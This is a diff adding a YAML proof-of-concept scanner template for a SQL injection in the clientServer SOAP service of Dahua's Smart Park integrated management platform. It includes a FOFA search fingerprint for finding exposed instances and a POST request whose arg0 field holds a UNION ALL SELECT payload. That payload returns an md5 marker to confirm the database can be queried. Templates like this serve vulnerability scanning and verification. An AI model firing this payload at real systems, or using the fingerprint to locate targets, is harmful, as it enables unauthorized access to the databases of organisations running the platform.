@@ -1,0 +1,26 @@
+id: poc-yaml-dahua-smart-park-clientserver-sql-injection
+info:
+  name: 大华智慧园区综合管理平台 clientServer SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 大华智慧园区综合管理平台
+  fofa: app="dahua-智慧园区综合管理平台"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /portal/services/clientServer
+  headers:
+    Content-Type: text/xml;charset=UTF-8
+  data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:cli=\"http://clientServer.webservice.dssc.dahua.com\">\n  <soapenv:Header/>\n\
+    \  <soapenv:Body>\n  <cli:getGroupInfoListByGroupId>\n    <!--type: string-->\n\
+    \      <arg0>-5398) UNION ALL SELECT 5336,5336,5336,5336,md5({{.t1}})-- -</arg0>\n\
+    \    <!--type: long-->\n    <arg1>10</arg1>\n    </cli:getGroupInfoListByGroupId>\n\
+    \    </soapenv:Body>\n  </soapenv:Envelope>"
+  expression: status_code == 200 && contains(body,t2) && contains(body,"groupdetail")
+    && contains(content_type,"text/xml")
+transport: http
